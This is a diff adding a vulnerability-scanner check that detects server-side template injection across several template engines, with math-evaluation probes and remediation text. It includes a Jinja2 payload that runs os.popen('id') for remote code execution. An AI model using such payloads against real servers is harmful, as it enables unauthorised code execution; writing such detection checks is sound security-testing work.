@@ -1,0 +1,39 @@
+metadata:
+    language: v2-beta
+    name: "SSTI - Multi Engine Detection with WAF Bypass"
+    description: "Tests for SSTI across Jinja2, Twig, Freemarker, Velocity, Pebble, Smarty, Mako"
+    author: "BCheck Arsenal"
+    tags: "ssti", "rce", "waf-bypass"
+
+given insertion point then
+    send payload:
+        replacing: "{insertion_point}"
+        following replacements:
+            - "{{7*7}}"
+            - "${7*7}"
+            - "#{7*7}"
+            - "<%= 7*7 %>"
+            - "{{7*'7'}}"
+            - "${{7*7}}"
+
+    if {mathCheck.response} matches "49" then
+        report issue:
+            severity: high
+            confidence: firm
+            detail: "Server-side template injection detected. Mathematical expression evaluated server-side."
+            remediation: "Never pass user input into template strings. Use sandboxed template engines."
+    end if
+
+    send payload:
+        replacing: "{insertion_point}"
+        following replacements:
+            - "{{request.__class__.__mro__[2].__subclasses__()}}"
+            - "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+
+    if {jinja2.response} matches "(uid=|subprocess|catch_warnings|Popen)" then
+        report issue:
+            severity: high
+            confidence: certain
+            detail: "Jinja2 SSTI with RCE detected."
+            remediation: "Use Jinja2 SandboxedEnvironment. Never render user input as template code."
+    end if
